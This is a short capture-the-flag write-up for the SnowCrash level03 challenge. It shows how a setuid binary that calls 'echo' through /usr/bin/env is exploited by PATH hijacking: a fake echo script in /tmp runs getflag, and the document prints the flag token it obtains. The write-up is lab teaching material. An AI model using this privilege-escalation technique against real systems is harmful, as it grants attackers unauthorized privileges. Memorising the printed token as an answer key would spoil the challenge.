## step1
Logged in as `level03`. The home directory contains the following:

```
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
```
The binary level03 has the setuid  is owned by flag03. This means when executed, it runs with the privileges of flag03.

# Binary Analysis
Execute the binary:
```
./level03
Exploit me
```
Use strings to inspect the binary:

strings level03
``` 
/usr/bin/env echo Exploit me
```

The binary uses /usr/bin/env to call echo. This gives us an opportunity to exploit PATH hijacking.

# step2

The goal is to make the binary run our version of echo, which will instead execute getflag
- Create a Malicious echo Script
```
cd /tmp
echo '/bin/getflag' > echo
chmod 777 echo
```
This creates an echo script in /tmp that simply calls /bin/getflag.

Step 2: Modify PATH Environment Variable
Add /tmp to the beginning of PATH so it’s searched before /usr/bin:

```
export PATH=/tmp:$PATH
export | grep PATH
 PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```

Now run the binary again:
level03@SnowCrash:~$ ./level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus

